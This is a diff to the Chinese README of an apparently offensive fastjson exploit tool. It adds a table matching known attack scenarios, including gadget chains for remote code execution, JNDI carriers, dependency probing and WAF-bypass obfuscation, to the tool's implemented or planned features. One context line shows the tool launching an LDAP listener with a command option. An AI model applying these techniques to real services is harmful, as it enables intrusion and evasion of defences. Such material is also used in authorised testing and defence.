@@ -95,6 +95,29 @@ python3 fastjson_exploit.py ldap --lport 1389 --lhost <本机IP> --mode el --cmd
 python3 fastjson_exploit.py
 ```
 
+## FastJsonParty（lemono0）场景覆盖对照
+
+| FastJsonParty 场景/技术 | 本工具状态 |
+|---|---|
+| FastJson 鉴别（报错/解析特征/响应状态） | ✅ detect 链 |
+| AutoCloseable 精确版本探测 | ✅ |
+| DNSLOG 出网探测（InetAddress 等变体） | ✅（自建 HTTP/LDAP 回传替代 dnslog） |
+| **依赖类探测（Character 报错法）** | ✅ `--chain deps`（17 类候选；依赖目标回显完整异常，掩码目标不可判） |
+| ≤1.2.24 TemplatesImpl / JdbcRowSetImpl / BCEL | ✅ |
+| ≤1.2.47 cache1247 / BCEL 两段 / **Mybatis+BCEL** | ✅（mybatis 变体） |
+| **C3P0 二次反序列化**（≤1.2.47 不出网通杀，fastjson 原生链） | ❌ 未实现（需 fastjson 原生反序列化 payload 生成器，Roadmap 高优） |
+| ≤1.2.60/61 commons-configuration JNDIConfiguration | ✅ 新增（jndi 链载体） |
+| ≤1.2.67 Shiro JndiObjectFactory（autotype on） | ✅ 新增（jndi 链载体） |
+| 1.2.36-1.2.62 regex ReDoS（版本探测） | ❌ 未实现 |
+| ≤1.2.68 **写文件**（SafeFileOutputStream+kryo / commons-io 2.0-2.8 / JDK11 无依赖链） | ❌ 未实现（**不出网场景核心能力，Roadmap 最高优**） |
+| ≤1.2.68 **读文件**（commons-io BOM 报错盲注 / DNS 外带） | ❌ 未实现（有 mysql LOCAL INFILE 读文件可部分替代） |
+| MySQL JDBC 5.x/6.x 载体（JDBC4Connection 等） | ⚠️ 已有 8.0.19 双载体，5.x/6.x 载体未实现 |
+| 1.2.76-1.2.80 **Groovy ASTTransformation 两段远程类加载** | ❌ 未实现（1.2.80 关键 RCE 链，Roadmap 高优；现有 groovy 仅为 LDAP BeanFactory 模式） |
+| 1.2.73-1.2.80 Aspectj 读文件回显（三段缓存） | ❌ 未实现 |
+| WAF 绕过：Unicode/Hex | ✅ `--unicode-escape` |
+| WAF 绕过：**_/- 字段名混淆** | ✅ 新增 `--waf-underscore`（实测 fastjson 正常解析、LDAP 命中） |
+| WAF 绕过：字符填充 | ❌ 未实现（易加） |
+
 ## 官方 Security Advisory 对照（CVE-2026-16723，fastjson2 wiki）
 
 参考 alibaba/fastjson2 官方通告（FearsOff 负责任披露，2026-07）核实的事实与本工具行为：
